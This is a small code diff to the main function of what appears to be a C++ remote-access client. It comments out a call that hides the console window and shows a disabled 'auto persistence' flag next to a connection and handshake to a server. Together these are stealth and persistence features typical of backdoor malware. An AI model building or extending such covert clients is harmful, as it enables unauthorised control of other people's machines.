@@ -6,17 +6,15 @@
 int main()
 {
     //-lws2_32
-    ShowWindow(GetConsoleWindow(),SW_HIDE);
+    //ShowWindow(GetConsoleWindow(),SW_HIDE);
 
     Connexion Client; 
     HandShake Handshake;
-    
 
     //bool auto_persistence = false; //allows you to know if the auto persistence mode is active or not.
 
     Client.openConnexion();
     cout << "[+] Connected." << endl;
-
 
     cout << "Start connexion in startHandShake." << endl;
 
